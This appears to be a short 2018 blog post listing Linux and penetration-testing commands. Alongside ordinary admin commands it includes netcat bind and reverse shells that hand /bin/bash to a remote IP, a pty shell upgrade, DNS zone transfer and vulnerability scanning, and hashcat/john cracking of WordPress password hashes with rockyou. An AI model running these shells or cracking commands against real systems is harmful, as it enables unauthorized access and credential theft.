---
layout: post
title:  "Some utils commands and tools for Linux"
date:   2018-11-16 23:46:00 -0300
categories: tutorial linux hacker
---
This is a list of some utils command for linux and pentest:
``` 
# Start webserver
service apache2 start

# See all open port
netstat -nlpt

# See logs apache
tail -f /var/log/apache2/access.log

# Navigate using cli
curl 192.168.1.1

# Conecting to a TCP port
nc -v site.com 80

# Listen a TCP port
nc -nlp 6000 -e /bin/bash

# Reverse Conection to TCP port
nc -vnlp 443 # On Your machine
nc 192.168.1.10 443 -e /bin/bash # On your remote machine

# Running Python with module
python -m SimpleHTTPServer 80

# BurpSuite is a proxy intercept for HTTP

# See information about owner
whois site.com

# List dns names of site
dnsenum --enum site.com
fierce -dns site.com

# resolve dns name to ip
host www.site.com
host -t ns site.com

# Transfer zone of dns
host -l site.com primarydns.site.com

# Port scan
nmap -v -sS -Pn 192.168.1.1 172.0.0.1

# HTTP URL Scan
dirb http://site.com/
dirb http://site.com/ /usr/share/dirb/wordlists/small.txt

# HTTP Scanner of Vulnerabilities
nikto -h http://site.com

# Wordpress Scanner of Vulnerabilities
wpscan --url anwpsite.com
wpscan --url anwpsite.com --enumerate ap
wpscan --url anwpsite.com --enumerate t

# Hash Identifier
hash-identifier 

# Crack of Hash key to Wordpress
hashcat -m 400 hashfilewithkey /usr/share/wordlists/rockyou.txt
john --list=formats
john --format=phpass --wordlist /usr/share/wordlists/rockyou.txt hashfilewithkey

# Get interactive shell with python
python -c 'import pty; pty.spawn("/bin/bash")'

#Login in mySQL
mysql -uroot -p

# Compile C code to x86 in x64 enviroment
gcc -m32 yourcode.c -o yourcode -pthread

# See rules of Firewall
iptables -nL

# Tunnel SSH for reverse conection
ssh -fN 443:localhost:22 root@myvpsserver

# Syncronize remote folders
rsync -Cravzp /path/of/origin user@remotemachine:/path/of/destiny


```
